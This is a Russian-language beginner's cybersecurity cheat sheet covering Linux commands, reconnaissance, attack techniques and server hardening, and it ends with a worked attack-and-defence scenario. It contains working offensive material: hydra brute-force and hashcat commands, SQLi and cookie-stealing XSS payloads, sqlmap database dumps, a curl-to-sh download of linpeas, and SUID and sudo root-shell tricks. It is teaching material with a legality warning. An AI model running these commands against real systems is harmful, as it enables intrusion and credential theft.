01

Как пользоваться памяткой · Карта местности

Начнем с Linux, затем переходим к сетям — дальше разведка и атака/защита уже «собираются» сами.

⚠ Строгое предупреждение о легальности Памятка — учебный материал. Запуск атакующих команд против систем, которые тебе не принадлежат и на тестирование которых нет письменного разрешения, — это уголовное преступление во всех странах: чёрный хакинг (несанкционированное проникновение в чужие системы) наказуем везде. Практикуйся только на своих машинах, виртуальных лабораториях или легальных площадках: TryHackMe, Hack The Box, OWASP Juice Shop.

Порядок чтения

  • Шаг 1. Раздел «Linux» — доведи базовые команды до автоматизма (в песочнице, раздел 09).
  • Шаг 2. «Roadmap» — выбери направление: Red Team, Blue Team или AppSec.
  • Шаг 3. «Разведка» → «Атака» (если атакующий путь) или «Защита и Hardening» (если защитный).
  • Шаг 4. «Сквозной сценарий» — посмотри, как всё связывается в одну цепочку.

Аналогия: замок

  • Замок — сервер и инфраструктура (Linux, файлы, процессы).
  • Охрана у ворот — firewall, fail2ban, IDS («Защита»).
  • Разведка стен — recon: порты, сервисы, поддомены.
  • Меч — инструменты атаки: брутфорс, SQLi, privesc.
  • Щит — hardening: патчи, права доступа, аудит логов.

Мини-глоссарий

CVE — уникальный номер уязвимости (Common Vulnerabilities and Exposures). Ищешь CVE → ищешь патч или эксплойт. → ресурсы
Payload — полезная нагрузка: код/команда, которую атакующий доставляет жертве (shell, скрипт). → атака
Privilege Escalation — повышение привилегий: из обычного пользователя до root/admin. → privesc
Zero-day — уязвимость, о которой вендор ещё не знает (или не выпустил патч). → защита
Phishing — социальная инженерия: жертва сама «открывает дверь» по ссылке/письму. → разведка
C2 (Command & Control) — канал управления скомпрометированной машиной. → сценарий
Lateral Movement — горизонтальное перемещение атакующего внутри сети после первого доступа. → сценарий
MITM (Man-in-the-Middle) — перехват и подмена трафика между двумя сторонами. → инструменты
02

Roadmap: что учить и куда развиваться

Три ступени. Первая — обязательна для всех, третья — выбор специализации.

1

База: Linux + сети

  • Linux: файловая система, права (chmod/chown), процессы, пайплайны и grep. Без этого ни один инструмент не «покажет».
  • Сети: OSI/TCP-IP, IP/подсети/CIDR, DNS, HTTP(S), основные порты (22, 80, 443, 3306…).
  • Проверка себя: объяснить вслух, как пакет доходит от браузера до сервера и что отвечает firewall.
2

Скриптинг: Bash + Python

  • Bash: циклы, функции, обработка вывода команд — автоматизация рутины и парсинг логов.
  • Python: requests (HTTP), socket/scapy (сети), paramiko (SSH). Скрипт = твой личный инструмент под задачу.
  • Проверка себя: написать скрипт, который сам сканирует порты и сохраняет результат в CSV.
3

Выбор пути

Путь Суть Ключевые навыки и инструменты
Red Team Атакующий: находит уязвимости до злоумышленника nmap, sqlmap, hydra, Metasploit, privesc; CTF (HTB, TryHackMe)
Blue Team Защитник: видит атаки и реагирует логи (journalctl), SIEM, fail2ban, hardening, анализ артефактов
AppSec Безопасность приложений на этапе разработки OWASP Top 10, code review, SAST/DAST, безопасные паттерны
Частый вопрос новичка«С чего начать — с атак или защиты?» С базы (шаг 1–2), затем выбери один путь и углубляйся в него. Прыгать сразу в Metasploit без понимания сетей — как учить стрельбу, не зная, что такое прицел.
03

Linux: файлы и система

Фундамент для всех остальных разделов. Терминал — это «руки» специалиста по безопасности.

Зачем это нужно (на пальцах)Любая атака и защита начинается с системы: файлы, права, процессы. Умение быстро читать систему = умение быстро находить следы.
АналогияLinux — как дом: каталоги — комнаты, права доступа — замки на дверях, процессы — жильцы, которые сейчас в доме. grep/find — это поиск по дому с фонариком.
Что будет, если проигнорироватьИнструменты (nmap, hydra) будут «чёрным ящиком»: не поймёшь их вывод, не сможешь автоматизировать рутину и читать логи при инциденте.
Самое важное
  • Пайплайн | — склейка команд.
  • Права rwx и chmod — основа контроля доступа.
  • grep/find — 80% повседневной работы.

Файлы и навигация

ls — список файлов

База 
ls -la
ls -lah /var/log

-l — подробный вывод (права, владелец, размер), -a — включая скрытые, -h — человекочитаемые размеры.

#linux#files

cd — смена каталога

База 
cd /var/log
cd ..        # на уровень вверх
cd ~          # в домашнюю директорию
pwd           # где я сейчас

/etc — конфиги, /var/log — логи, /tmp — временные файлы (любимое место атакующих), /root — домашний каталог root.

#linux#files

cat / head / tail — чтение файлов

База 
cat /etc/passwd
head -n 20 access.log
tail -f /var/log/auth.log   # следить за логом в реальном времени

cat — весь файл, head/tail -n N — первые/последние N строк, -f — «хвост» в live-режиме (ключевая команда при мониторинге).

#linux#logs

grep — поиск по тексту

База 
grep -i "error" app.log
grep -rn "password" /etc/ 2>/dev/null
tail -f auth.log | grep --line-buffered "Failed password"

-i — без учёта регистра, -r — рекурсивно по каталогу, -n — номера строк, -E — расширенные регулярки. 2>/dev/null — подавить ошибки «нет доступа».

#linux#logs

find — поиск файлов по критериям

База 
find /var/www -name "*.php"
find . -mtime +7 -name "*.log"          # файлы старше 7 дней
find / -perm -4000 -type f 2>/dev/null   # SUID-бинарники (привет, privesc!)

-name — по имени (шаблоны), -mtime +N — по дате изменения, -perm -4000 — SUID-файлы. Классика разведки на скомпрометированной машине.

#linux#privesc

Права доступа и архивы

chmod — права доступа

База 
chmod 755 script.sh     # rwxr-xr-x: владелец всё, остальные чтение+запуск
chmod 644 config.txt    # rw-r--r-
chmod +x exploit.py     # добавить право на запуск

Цифра = сумма прав: r=4, w=2, x=1. Три тройки — владелец / группа / остальные. Ошибка в правах (например, 777) — частая причина инцидентов.

#linux#hardening

tar — архивация

База 
tar -czvf backup.tar.gz /var/www     # создать gzip-архив
tar -xzvf backup.tar.gz              # распаковать
tar -tzf backup.tar.gz               # только список содержимого

c — create, x — extract, t — list, z — gzip, v — verbose, f — имя файла (всегда в конце).

#linux#files

Процессы и сеть

ps / top — процессы

База 
ps aux | grep sshd
ps aux --sort=-%cpu | head -n 10   # топ по CPU
top                                # интерактивно (q — выход)
top -c                             # полные командные строки

a — все процессы, u — ориентация на пользователя. Ищешь подозрительный процесс? Смотри PID, владельца и полный путь: ls -l /proc/<PID>/exe.

#linux#processes

ss / netstat — сокеты и порты

База 
ss -tulnp                 # слушающие TCP/UDP-порты + процессы
netstat -tulpn            # тот же смысл (старая утилита)
ss -tnp state established | head   # активные соединения

t/u — tcp/udp, l — listening, n — без резолва имён, p — процессы (полный список — от root). Ответ на вопрос «что вообще слушает этот сервер?».

#linux#network

lsof — кто открыл файл/порт

Продвинутый 
lsof -i :443              # кто слушает порт 443
lsof -p 1234              # все файлы процесса с PID 1234
lsof +D /var/www          # всё открытое в каталоге

«LISt OF Open Files». Незаменим при расследовании: какой процесс держит подозрительное соединение или файл.

#linux#network
Частый вопрос новичка«Зачем учить команды, если есть GUI?» В продакшене и на скомпрометированных машинах GUI часто нет — только SSH-терминал. Скорость в терминале = скорость реакции при инциденте.
Типичная ошибкаЗапускать find / … или grep -r … /etc без 2>/dev/null и без понимания, что рекурсивный поиск по всей системе — медленно и может «загрузить» сервер. Сначала сужай каталог.
04

Разведка (Recon)

Собери максимум информации до первого шага атаки. Хороший recon экономит часы и оставляет меньше следов.

Зачем это нужно (на пальцах)Прежде чем лезть в дом, смотри: где окна, какие замки, кто живёт. Recon = карта целей: порты, сервисы, версии, поддомены, люди.
АналогияШпион перед операцией изучает расписание охраны. Разведчик перед атакой изучает поверхность атаки (attack surface) жертвы.
Что будет, если проигнорироватьСлепая атака: медленнее, громче (триггерит IDS), чаще упирается в «не то» место. 80% успеха — в данных, собранных до первого пакета.
Самое важное
  • Пассивный recon (dig, whois) не трогает цель.
  • nmap — скелет любого сканирования.
  • Версии сервисов = ключ к эксплойтам.

nmap — сканирование портов и сервисов

База 
nmap target_ip                          # топ-1000 TCP-портов
nmap -sV -sC target_ip                  # версии сервисов + дефолтные NSE-скрипты
nmap -p- --min-rate=5000 target_ip      # все 65535 портов, быстро
nmap -O target_ip                       # определение ОС (точнее от root)

-sV — версия сервиса, -sC — дефолтные скрипты NSE, -p- — все порты, -O — OS fingerprinting. Результат: что открыто и какие версии.

#recon#network

gobuster / ffuf — перебор директорий и имён

База 
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w wordlist.txt          # FUZZ — маркер подстановки
gobuster vhost -u http://target -w subdomains-top1000.txt

Ищет «двери», которые не указаны в меню сайта: /admin, /backup, /.git. ffuf быстрее и гибче (поддерживает JSON-ответы, заголовки).

#recon#web

dig / whois — пассивная разведка DNS и домена

База 
dig example.com A +short          # IP-адрес
dig @8.8.8.8 example.com MX       # почтовые серверы (через чужой DNS)
dig example.com TXT               # SPF / DMARC / DKIM
whois example.com                 # регистратор, даты, администратор

Пассивный recon: цель ничего не видит. MX-записи часто раскрывают инфраструктуру (почта, CRM), TXT — настройки аутентификации почты.

#recon#osint

masscan / subfinder — масштабная разведка

Продвинутый 
masscan 10.0.0.0/24 -p80,443 --rate=5000   # быстрый скан целой подсети
subfinder -d example.com                   # пассивный поиск поддоменов

masscan — на порядки быстрее nmap (для широких диапазонов; точность ниже). subfinder собирает поддомены из публичных источников без обращения к цели.

#recon#osint
Частый вопрос новичка«nmap или masscan?» Для одной-двух целей — nmap (точнее, скрипты). Для целой подсети/облака — сначала masscan по ключевым портам, затем nmap -sV только на найденных хостах.
Типичная ошибкаСканировать чужие IP «просто посмотреть». Даже пассивный nmap виден в логах цели. Разрешение (scope) — до первого пакета, а не после.
05

Атака

Только на разрешённых целях: свои машины, лабы, CTF. Порядок: доступ → закрепление → повышение привилегий.

Зачем это нужно (на пальцах)Атака — проверка защиты: если ты можешь войти, сможет и злоумышленник. Понимание атак = понимание, что защищать.
АналогияМеч в руках мастера: сначала подберёшь замок (брутфорс), потом найдёшь окно (веб-уязвимость), и только после этого — залезешь на второй этаж (privesc).
Что будет, если проигнорироватьЗащитник без понимания атак ставит «замок» там, где злоумышленник войдёт через окно. Атакующий без базы не отличит уязвимость от шума.
Самое важное
  • Брутфорс бьёт по слабым паролям — корень большинства инцидентов.
  • SQLi/XSS — топ веб-уязвимостей (OWASP).
  • Privesc превращает «доступ» в «контроль».

hydra — брутфорс сетевых сервисов

База 
hydra -L users.txt -P pass.txt ssh://target_ip
hydra -l admin -P pass.txt target_ip http-post-form "/login:u=^USER^&p=^PASS^:F=incorrect"
hydra -t 4 -w 10 -V ftp://target_ip

-L/-P — списки логин/паролей, -l — один логин, -t — потоки, -w — задержка (тише = незаметнее). http-post-form: F= — маркер «неудачного» ответа.

#attack#brute-force

hashcat — взлом хэшей паролей

Продвинутый 
hashcat -m 0 -a 0 md5_hashes.txt rockyou.txt         # md5, прямой перебор
hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt   # sha512crypt ($6$, Linux shadow)
hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt   # bcrypt ($2y$, веб-пароли)
hashcat -m 1000 -a 0 nt.hashes rockyou.txt           # NTLM (Windows)

-m — тип хэша, -a — режим атаки (0 — словарь, 3 — маска). Если у тебя есть дамп БД или /etc/shadow — hashcat решает всё остальное. GPU ускоряет в десятки раз.

#attack#brute-force

SQLi — SQL-инъекции

Продвинутый 
# Классические тесты (в полях формы / GET-параметрах):
' OR 1=1 --
" OR ""="
) OR 1=1 #

# Автоматизация:
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D shop -T users --dump

Суть: пользовательский ввод попадает в SQL-запрос без экранирования. Признаки: ошибки БД, асимметрия ответов на «/». Защита: prepared statements (параметризованные запросы) — всегда.

#attack#web

XSS — кросс-сайтовый скриптинг

Продвинутый 
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Скрипт выполняется в браузере жертвы: кража cookie, сессий, фишинг внутри доверенного сайта. Защита: экранирование вывода (context-aware encoding), CSP-заголовки.

#attack#web

Privilege Escalation — повышение привилегий

linpeas / linenum — автоматический аудит Linux

Продвинутый 
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a          # полный аудит: SUID, sudo, cron, ядро, контейнеры

Скрипт сам проверяет десятки векторов и подсказывает, что попробовать. Результат — список «возможных путей» до root.

#attack#privesc

Ручные проверки (то, что ищет linpeas)

Продвинутый 
sudo -l                          # какие команды можно запускать от sudo?
find / -perm -4000 2>/dev/null   # SUID-бинарники (vim, find, nmap → root)
cat /etc/crontab; ls /etc/cron*  # cron: кто и что запускает с правами root
ls -la /var/backups/             # бэкапы БД с паролями в открытом виде
id                               # кто я? какие группы? (docker = почти root)
uname -a                         # версия ядра → CVE по LPE-базам

Классика: sudo vim → :!/bin/sh; SUID на find → find / -exec /bin/sh \; -quit; доступ к группе docker → контейнер с монтированным /.

#attack#privesc
Частый вопрос новичка«Почему не сразу sqlmap на всё подряд?» Инструмент без понимания уязвимости даёт шум: ложные срабатывания, бан IP, сработавший WAF. Сначала ручной тест (одна инъекция), потом автоматизация.
Типичная ошибкаОстанавливаться на первом доступе: shell обычного пользователя — это не победа. Цель атаки почти всегда выше: root, данные, домен-контроллер. Privesc — обязательный шаг.
06

Защита и Hardening

Защитник думает как атакующий: закрывает не «то, что удобно», а то, что реально эксплуатируется.

Зачем это нужно (на пальцах)Каждый открытый порт — дверь. Каждый слабый пароль — ключ в кармане. Hardening = убрать лишние двери и усложнить замки.
АналогияОхрана: firewall — ворота, fail2ban — охранник с камерой (видит попытки взлома), логи — записи в журнале посещений. Если журнал пуст — либо всё спокойно, либо атакующий его удалил.
Что будет, если проигнорироватьПервый же сканер в интернете найдёт твой SSH за минуты. Без fail2ban и патчей сервер «снимут» до того, как ты о нём вспомнишь.
Самое важное
  • Минимум открытых портов (default deny).
  • Автоматические патчи + fail2ban на SSH.
  • Логи — всегда, и выводить их наружу.

ufw — файрвол (простой интерфейс)

База 
sudo ufw default deny incoming
sudo ufw allow 22/tcp        # SSH
sudo ufw allow 443/tcp       # HTTPS
sudo ufw enable
sudo ufw status verbose

Принцип: всё запрещать по умолчанию, открывать точечно. default deny incoming — первая команда на любом новом сервере.

#defense#hardening

iptables — низкоуровневый файрвол

Продвинутый 
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -P INPUT DROP
# Лимит попыток SSH (5 новых соединений/минуту с IP):
sudo iptables -A INPUT -p tcp --dport 22 -m recent --set --name SSH
sudo iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP

iptables — «сырой» уровень (ufw поверх него). Правила читаются сверху вниз; порядок важен. Для персистентности: apt install iptables-persistent.

#defense#hardening

journalctl — анализ системных логов

База 
sudo journalctl -xe                     # последние ошибки + контекст
sudo journalctl -u sshd --since "1 hour ago"   # только SSH за час
sudo journalctl -k | grep -i error      # логи ядра
journalctl --list-boots                 # история загрузок

systemd-journald — центральный журнал. При инциденте: сначала -xe, затем сужать по сервису (-u) и времени (--since/--until).

#defense#logs

Чеклист базового hardening Linux-сервера

  • Патчи: apt update && apt full-upgrade -y + unattended-upgrades (автообновление безопасности).
  • SSH: запрет root-входа (PermitRootLogin no), ключи вместо паролей, смена порта — опционально.
  • fail2ban: jail для sshd (бан после 3 неудачных попыток) + jail для веб-логинов.
  • Файрвол: ufw default deny incoming; открыты только 22/443 (+ что нужно).
  • Пользователи: без пароля у root, sudo только для нужных команд (/etc/sudoers.d), никаких SUID «на всякий случай».
  • Логи: journald + rsyslog на внешний сервер (атакующий не удалит то, что уже улетело).
  • Мониторинг: алерт на новые root-сессии, изменения в /etc/passwd, запуск неизвестных бинарников.
Частый вопрос новичка«ufw или iptables?» Для 90% задач — ufw (читается человеком). iptables нужен, когда нужны тонкие правила: rate-limiting по IP, NAT, сложные цепочки.
Типичная ошибкаЗакрыть SSH в файрволе и забыть про IP — потом «спасает» только консоль у провайдера. Всегда держи второй канал доступа (VPN, облачная консоль) до того, как ужесточать правила.

Топ процессов по памяти

База 
ps aux --sort=-%mem | head -n 10

Кто «съедает» RAM — за секунду.

Список открытых сервисов с процессами (от root).

База 
nmap -sV --top-ports 50 -oA scan target_ip

-oA — результат сразу в три формата (nmap/grep/xml) для дальнейшего анализа.

#recon#network

Неудачные SSH-входы за сутки

База 
sudo journalctl -u sshd --since "24 hours ago" | grep "Failed password" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head

Топ IP, которые брутфорсят твой SSH. Дальше — fail2ban или бан в файрволе.

(sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null) | tee privesc.txt

Два главных вектора LPE в одном файле для анализа.

#attack#privesc

Файлы, изменённые за последние 24 часа

Продвинутый

Ищет следы атакующего: изменённые конфиги и веб-файлы (webshells).

Все root-сессии за неделю

Кто и когда входил под root — базовая проверка при расследовании.

Песочница: терминал-эмулятор

Безопасный тренажёр: команды выполняются локально в браузере с фейковым выводом. Ничего не отправляется наружу, ничего не ломается. Попробуй базовые команды из раздела Linux.

sandbox@cheatsheet: ~
user@lab:~$

Поддерживаются: help, ls, cd, cat, pwd, whoami, id, uname, ps, ss, grep, find, chmod, history, clear. Файловая система — фейковая (несколько каталогов и файлов). Команды вне списка честно сообщают «command not found».

Частый вопрос новичка«Это реальный Linux?» Нет — это тренажёр для отработки мышечной памяти: синтаксис, флаги, пайплайны. Настоящая практика — в Docker-контейнере или на VPS (только своих!).

Сквозной сценарий: путь атаки глазами атакующего и защитника

Учебный пример на вымышленном сервере shop.example.com (192.0.2.10). Каждый шаг — что делает атакующий и что видит защитник в логах.

1

Разведка: nmap + перебор директорий

nmap -sV -sC 192.0.2.10
# open  80/tcp   http    Apache/2.4.57 (Debian)
# open  22/tcp   ssh     OpenSSH_9.2

ffuf -u http://shop.example.com/FUZZ -w common.txt -fc 404
# /admin          [301] -> /admin/
# /backup         [200]  (12 KB)
Видит защитник: в access.log — серия GET-запросов с одного IP, много 404. Если настроен fail2ban/IDS — алерт «сканирование». Реакция: временно банить IP, проверить, что /backup не отдаёт файлы.
2

Доступ: SQLi в форме логина админки

# Поле «Логин» в /admin/login.php:
admin' --

# sqlmap подтверждает:
sqlmap -u "http://shop.example.com/admin/login.php?user=admin" --dbs
# databases: information_schema, shop
Видит защитник: в access.log — запросы с подозрительными параметрами (%27, --), аномально длинные строки. WAF (если есть) должен был заблокировать; без WAF — только анализ логов и патч: prepared statements.
3

Эксплуатация: дамп БД + webshell

sqlmap -D shop -T users --dump
# admin  $2y$10$N9qO8...   (bcrypt-хэш)

# Через SQLi — запись webshell в /var/www/html/panel.php
# Теперь у атакующего есть shell обычного пользователя www-data
Видит защитник: новый файл panel.php, созданный процессом apache2 (проверка: find /var/www -mtime -1, мониторинг создания файлов). Реакция: удалить файл, закрыть SQLi, сменить пароли БД.
4

Persistence + разведка системы

whoami; id            # www-data : www-data
sudo -l               # (пусто — sudo не разрешено)
find / -perm -4000 2>/dev/null
# /usr/bin/find       <- SUID!

cat /etc/passwd | grep -v nologin   # активные пользователи
Видит защитник: процесс apache2 запускает подозрительные команды (auditd/sysmon-логи). Изменения в cron, новые ключи SSH — маркеры закрепления. Реакция: изолировать хост, сохранить образ диска для расследования.
5

Privilege Escalation: SUID find → root

find / -exec /bin/sh \; -quit
# id
# uid=0(root) gid=0(root)
Видит защитник: в логах — смена UID процесса (auditd: syscall=openat ... uid=33 → euid=0). Корневая причина: SUID-бит на /usr/bin/find, который не нужен. Реакция: снять SUID (chmod u-s /usr/bin/find), найти вектор входа (SQLi), закрыть его.

Уроки из сценария

  • Атакующий шёл по пути наименьшего сопротивления: открытый /backup → SQLi в админке → SUID. Каждый шаг был «подарком» конфигурации.
  • Защитник выигрывает не одним инструментом, а слоем: WAF (шаг 2) + мониторинг файлов (шаг 3) + auditd (шаг 5). Сработал бы любой слой — цепочка оборвалась.
  • Время реакции решает всё: между шагами 1 и 5 у защитника были часы. Логи, которые никто не читает, — это признание поражения заранее.
